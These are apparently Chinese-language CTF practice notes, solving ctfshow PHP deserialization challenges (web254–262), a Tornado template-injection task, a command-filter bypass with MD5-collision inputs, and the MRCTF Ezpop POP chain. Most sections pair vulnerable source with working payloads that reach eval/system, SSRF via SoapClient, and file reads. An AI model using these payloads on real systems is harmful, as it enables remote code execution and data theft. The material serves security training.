## ctfshow web12
考察:命令执行
知识点:
```
glob() 函数返回匹配指定模式的文件名或目录。
举个例子:
glob("*") 匹配任意文件
glob("*.txt")匹配以txt为后缀的文件
```

查看网页源代码发现 ?cmd
![图片](https://user-images.githubusercontent.com/81904597/113653035-9822ae00-96c7-11eb-9fbe-2ee06d317b0c.png)
目测考察命令执行
输出一下phpinfo()
```
?cmd=phpinfo();
```
里面禁用了很多函数
![图片](https://user-images.githubusercontent.com/81904597/113653163-e172fd80-96c7-11eb-88c1-a5df058909e2.png)

查看一下目录的文件(两种方式)
```
?cmd=print_r(scandir('.'));
?cmd=print_r(glob("*"));
```
![图片](https://user-images.githubusercontent.com/81904597/113653282-1ed78b00-96c8-11eb-9319-97b2312427af.png)
利用下面的让代码显示一下即可
```
highlight_file()
show_source()
```
参考yu师傅博客:https://blog.csdn.net/miuzzx/article/details/104372662


## ctfshow 反序列化刷题
### 魔术方法
```

    __construct()当一个对象创建时被调用(构造函数)

    __destruct()当一个对象销毁时被调用(析构函数)

    __toString()当一个对象被当作一个字符串使用

    __sleep() 在对象在被序列化之前运行

    __wakeup将在序列化之后立即被调用所写的内容需要有对象中的成员
    
```

web254
```

error_reporting(0);
highlight_file(__FILE__);
include('flag.php');
class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=false;
    public function checkVip(){
        return $this->isVip;
    }
    public function login($u,$p){
        if($this->username===$u&&$this->password===$p){
            $this->isVip=true;
        }
        return $this->isVip;
    }
    public function vipOneKeyGetFlag(){
        if($this->isVip){
            global $flag;
            echo "your flag is ".$flag;
        }else{
            echo "no vip, no flag";
        }
    }
}
$username=$_GET['username'];
$password=$_GET['password'];
if(isset($username) && isset($password)){
    $user = new ctfShowUser();
    if($user->login($username,$password)){
        if($user->checkVip()){
            $user->vipOneKeyGetFlag();
        }
    }else{
        echo "no vip,no flag";
    }
} 

```

```

?username=xxxxxx&password=xxxxxx

```

web255

```

error_reporting(0);
highlight_file(__FILE__);
include('flag.php');
class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=false;
    public function checkVip(){
        return $this->isVip;
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function vipOneKeyGetFlag(){
        if($this->isVip){
            global $flag;
            echo "your flag is ".$flag;
        }else{
            echo "no vip, no flag";
        }
    }
}
$username=$_GET['username'];
$password=$_GET['password'];
if(isset($username) && isset($password)){
    $user = unserialize($_COOKIE['user']);    
    if($user->login($username,$password)){
        if($user->checkVip()){
            $user->vipOneKeyGetFlag();
        }
    }else{
        echo "no vip,no flag";
    }
} 
```

```

<?php
class ctfShowUser{
    public $isVip=true;
    
}
echo serialize(new ctfShowUser);
要对反序列化后的;进行url编码
#user=O:11:"ctfShowUser":1:{s:5:"isVip"%3bb:1%3b}
```
![image](https://user-images.githubusercontent.com/81904597/114299459-e01c4900-9aaa-11eb-861b-d1488288dab8.png)

web256

```

error_reporting(0);
highlight_file(__FILE__);
include('flag.php');
class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=false;
    public function checkVip(){
        return $this->isVip;
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function vipOneKeyGetFlag(){
        if($this->isVip){
            global $flag;
            if($this->username!==$this->password){
                    echo "your flag is ".$flag;
              }
        }else{
            echo "no vip, no flag";
        }
    }
}
$username=$_GET['username'];
$password=$_GET['password'];
if(isset($username) && isset($password)){
    $user = unserialize($_COOKIE['user']);    
    if($user->login($username,$password)){
        if($user->checkVip()){
            $user->vipOneKeyGetFlag();
        }
    }else{
        echo "no vip,no flag";
    }
}
```

```

<?php
class ctfShowUser{
    public $isVip=true;
    public $username='a';

}
echo serialize(new ctfShowUser);

#user=O:11:"ctfShowUser":2:{s:8:"username"%3bs:1:"a"%3bs:5:"isVip"%3bb:1%3b}
```

![image](https://user-images.githubusercontent.com/81904597/114299471-ec080b00-9aaa-11eb-8d36-a4210069871a.png)
web 257

web 257

```
<?php

error_reporting(0);
highlight_file(__FILE__);
class ctfShowUser{
    private $username='xxxxxx';
    private $password='xxxxxx';
    private $isVip=false;
    private $class = 'info';
    public function __construct(){
        $this->class=new info();
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function __destruct(){
        $this->class->getInfo();
    }
}
class info{
    private $user='xxxxxx';
    public function getInfo(){
        return $this->user;
    }
}
class backDoor{
    private $code;
    public function getInfo(){
        eval($this->code);
    }
}
$username=$_GET['username'];
$password=$_GET['password'];
if(isset($username) && isset($password)){
    $user = unserialize($_COOKIE['user']);
    $user->login($username,$password);
}
```

```

<?php
class ctfShowUser{
    private $class;
    public function __construct(){
        $this -> class = new backDoor();
    }

}
class backDoor{
    private $code= 'system("cat f*");';
}

$b = new ctfShowUser();
echo urlencode(serialize(new ctfShowUser));

#user=O%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A17%3A%22system%28%22cat+f%2A%22%29%3B%22%3B%7D%7D

```
web 257

```
<?php

error_reporting(0);
highlight_file(__FILE__);
class ctfShowUser{
    private $username='xxxxxx';
    private $password='xxxxxx';
    private $isVip=false;
    private $class = 'info';
    public function __construct(){
        $this->class=new info();
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function __destruct(){
        $this->class->getInfo();
    }
}
class info{
    private $user='xxxxxx';
    public function getInfo(){
        return $this->user;
    }
}
class backDoor{
    private $code;
    public function getInfo(){
        eval($this->code);
    }
}
$username=$_GET['username'];
$password=$_GET['password'];
if(isset($username) && isset($password)){
    $user = unserialize($_COOKIE['user']);
    $user->login($username,$password);
}

```

```
<?php
class ctfShowUser{
    private $class;
    public function __construct(){
        $this -> class = new backDoor();
    }

}
class backDoor{
    private $code= 'system("cat f*");';
}

$b = new ctfShowUser();
echo urlencode(serialize(new ctfShowUser));

#user=O%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A17%3A%22system%28%22cat+f%2A%22%29%3B%22%3B%7D%7D

```
![image](https://user-images.githubusercontent.com/81904597/114299541-5f118180-9aab-11eb-974f-bf1ca8d371c0.png)
web 258

```

error_reporting(0);
highlight_file(__FILE__);
class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=false;
    public $class = 'info';
    public function __construct(){
        $this->class=new info();
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function __destruct(){
        $this->class->getInfo();
    }
}
class info{
    public $user='xxxxxx';
    public function getInfo(){
        return $this->user;
    }
}
class backDoor{
    public $code;
    public function getInfo(){
        eval($this->code);
    }
}
$username=$_GET['username'];
$password=$_GET['password'];
if(isset($username) && isset($password)){
    if(!preg_match('/[oc]:\d+:/i', $_COOKIE['user'])){
        $user = unserialize($_COOKIE['user']);
    }
    $user->login($username,$password);
}

```
```
<?php
class ctfShowUser{
    public $class;
    public function __construct(){
        $this->class=new backDoor();
    }
}
class backDoor{
    public $code='system("cat f*");';
}
$b=new ctfShowUser();
echo urlencode(serialize($b));

#user=O%3A%2b11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22class%22%3BO%3A%2b8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A17%3A%22system%28%22cat+f%2A%22%29%3B%22%3B%7D%7D

```
![image](https://user-images.githubusercontent.com/81904597/114299546-689ae980-9aab-11eb-8da2-46528b8c8aeb.png)

web259

```

?php
$target = 'http://127.0.0.1/flag.php';
$post_string = 'token=ctfshow';
$headers = array(
    'X-Forwarded-For: 127.0.0.1,127.0.0.1,127.0.0.1,127.0.0.1,127.0.0.1',
    'UM_distinctid:174d91b24a362-002efcda49f0538-4c3f257b-144000-174d91b24a53e4'
);
$b = new SoapClient(null,array('location' => $target,'user_agent'=>'y4tacker^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '.(string)strlen($post_string).'^^^^'.$post_string,'uri' => "aaab"));

$aaa = serialize($b);
$aaa = str_replace('^^',"\r\n",$aaa);
$aaa = str_replace('&','&',$aaa);
echo urlencode($aaa);

```

web260

```

<?php
error_reporting(0);
highlight_file(__FILE__);
include('flag.php');
if(preg_match('/ctfshow_i_love_36D/',serialize($_GET['ctfshow']))){
    echo $flag;
}

?ctfshow=ctfshow_i_love_36D

```

web262

```

error_reporting(0);
class message{
    public $from;
    public $msg;
    public $to;
    public $token='user';
    public function __construct($f,$m,$t){
        $this->from = $f;
        $this->msg = $m;
        $this->to = $t;
    }
}
$f = $_GET['f'];
$m = $_GET['m'];
$t = $_GET['t'];
if(isset($f) && isset($m) && isset($t)){
    $msg = new message($f,$m,$t);
    $umsg = str_replace('fuck', 'loveU', serialize($msg));
    setcookie('msg',base64_encode($umsg));
    echo 'Your message has been sent';
}
highlight_file(__FILE__);

```
```

<?php
/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-03 15:13:03
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-03 15:17:17
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/
highlight_file(__FILE__);
include('flag.php');
class message{
    public $from;
    public $msg;
    public $to;
    public $token='user';
    public function __construct($f,$m,$t){
        $this->from = $f;
        $this->msg = $m;
        $this->to = $t;
    }
}
if(isset($_COOKIE['msg'])){
    $msg = unserialize(base64_decode($_COOKIE['msg']));
    if($msg->token=='admin'){
        echo $flag;
    }
}

#msg=Tzo3OiJtZXNzYWdlIjoxOntzOjU6InRva2VuIjtzOjU6ImFkbWluIjt9

```
![image](https://user-images.githubusercontent.com/81904597/114299572-997b1e80-9aab-11eb-9322-72dcd523a6a2.png)

### [护网杯 2018]easy_tornad

![image](https://user-images.githubusercontent.com/81904597/114299681-258d4600-9aac-11eb-93c1-5734465df6ec.png)

存在一个Hint.txt
![Uploading image.png…]()

也就是说要想获得flag得知道cookie_sectet和filename,在flag.xtt里给了filename,那么我们只需要知道cookie_secret即可，因为是模板注入，所以我们要寻找注入点。
![Uploading image.png…]()

在error这里找到注入点。那么我们就可以获取cookie_secret了。

```
error?msg={{handler.settings}}

```
{'autoreload': True, 'compiled_template_cache': False, 'cookie_secret': 'c3103141-087a-4774-baae-121d0b3404f4'}
然后我们按照hint的要求构造payload即可。

```
file?filename=/fllllllllllllag&filehash=15d108a875afafaa2df3c257a74023d8
```
md5脚本

```
import hashlib
hash = hashlib.md5()

filename='/fllllllllllllag'
cookie_secret="c3103141-087a-4774-baae-121d0b3404f4"
hash.update(filename.encode('utf-8'))
s1=hash.hexdigest()
hash = hashlib.md5()
hash.update((cookie_secret+s1).encode('utf-8'))
print(hash.hexdigest())

```
### [安洵杯 2019]easy_web
打开题目,url里有一串不对劲的编码

```
index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd=

```
按照base64-base64-hex进行解码得到

```
555.png
```
也就是说此处进行了文件包含，包含了555.png，那么我们可以尝试读一下index.php,按照加密方式加密回去

```
<?php
error_reporting(E_ALL || ~ E_NOTICE);
header('content-type:text/html;charset=utf-8');
$cmd = $_GET['cmd'];
if (!isset($_GET['img']) || !isset($_GET['cmd']))
header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd=');
$file = hex2bin(base64_decode(base64_decode($_GET['img'])));

$file = preg_replace("/[^a-zA-Z0-9.]+/", "", $file);
if (preg_match("/flag/i", $file)) {
echo '';
die("xixi～ no flag");
} else {
$txt = base64_encode(file_get_contents($file));
echo "";
echo "
";
}
echo $cmd;
echo "
";
if (preg_match("/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|<|>/i", $cmd)) {
echo("forbid ~");
echo "
";
} else {
if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b'])) {
echo `$cmd`;
} else {
echo ("md5 is funny ~");
}
}

?>

```
关键代码位于下面，pass掉md5强类型以后，执行echo `cmd`但是对cmd进行了过滤，其中|\\\|相当于没有对\进行过滤,所以payload为

```
get:cmd=ca\t /flag
post:a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2

```
也可以使用sort

```
get:cmd=sort /flag
post:a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2

```
### [MRCTF2020]Ezpop

```
<?php
//flag is in flag.php
//WTF IS THIS?
//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95
//And Crack It!
class Modifier {
    protected  $var;
    public function append($value){
        include($value);
    }
    public function __invoke(){
        $this->append($this->var);
    }
}
class Show{
    public $source;
    public $str;
    public function __construct($file='index.php'){
        $this->source = $file;
        echo 'Welcome to '.$this->source."<br>";
    }
    public function __toString(){
        return $this->str->source;
    }
    public function __wakeup(){
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
            echo "hacker";
            $this->source = "index.php";
        }
    }
}
class Test{
    public $p;
    public function __construct(){
        $this->p = array();
    }
    public function __get($key){
        $function = $this->p;
        return $function();
    }
}
if(isset($_GET['pop'])){
    @unserialize($_GET['pop']);
}
else{
    $a=new Show;
    highlight_file(__FILE__);
}

<?php
class Modifier {
    protected  $var = "php://filter/convert.base64-encode/resource=flag.php";
}

class Show{
    public $source;
    public $str;
    public function __construct($file){
        $this->source = $file;
    }
}

class Test{
    public $p;
    public function __construct(){
        $this->p = new Modifier();
    }
}

$o = new Show('aaa');
$o->str= new Test();
$a= new Show($o);
echo urlencode(serialize($a));

```

```

payload:
pop=O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3Bs%3A3%3A%22aaa%22%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A52%3A%22php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3BN%3B%7D
```


